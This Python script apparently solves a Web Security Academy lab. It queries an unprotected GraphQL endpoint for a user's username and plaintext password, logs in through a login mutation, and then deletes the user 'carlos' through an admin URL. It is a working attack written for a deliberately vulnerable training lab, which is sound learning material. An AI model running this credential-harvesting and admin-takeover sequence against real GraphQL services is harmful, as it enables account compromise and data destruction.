from web_security_academy.core.logger import logger

import json


def solve_lab(session):
    # Explanation: Through a full introspection query, I learned of the query
    # "getUser(id:Int!): User". Additionally, the User type contains the fields
    # "username" and "password"
    query = {
        "query": "query { getUser(id: 1) { username password }}",
    }
    logger.info('Posting the following JSON to "/graphql/v1"...')
    logger.info(query)

    resp = session.post_path("/graphql/v1", json=query)
    resp = json.loads(resp.text)
    logger.info(f"Query result: {resp}")

    username = resp["data"]["getUser"]["username"]
    password = resp["data"]["getUser"]["password"]

    # GraphQL login
    query = {
        "query": "mutation login($input: LoginInput!) { login(input: $input) { token success }}",
        "variables": {"input": {"username": username, "password": password}},
    }
    resp = session.post_path("/graphql/v1", json=query)
    resp = json.loads(resp.text)
    if not resp["data"]["login"]["success"]:
        logger.failure(f"Unable to log in as {username}")
        return

    logger.info(f'Logged in with username "{username}" and password "{password}"')
    session.cookies.clear_session_cookies()
    session.cookies.set("session", resp["data"]["login"]["token"])

    session.get_path("/admin/delete?username=carlos")
    logger.info('Deleted user "carlos"')
